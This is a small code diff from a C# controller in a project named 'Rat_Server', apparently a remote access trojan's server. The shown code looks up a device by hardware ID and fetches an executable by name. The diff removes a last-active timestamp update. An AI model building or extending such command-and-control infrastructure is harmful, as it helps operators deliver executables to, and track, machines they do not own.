@@ -35,9 +35,6 @@ namespace Rat_Server.Controllers
             Guid Hwid = new Guid(_jwtService.GetJwtClaimValue(Authorization, FileName));
             Device device = await _context.Devices.SingleAsync(d => d.Hwid == Hwid);
 
-            device.LastActive = DateTime.Now;
-            await _context.SaveChangesAsync();
-
             ExeFile? exeFile = await _context.ExeFiles.SingleOrDefaultAsync(e => e.Name == FileName);
             if(exeFile == null)
             {
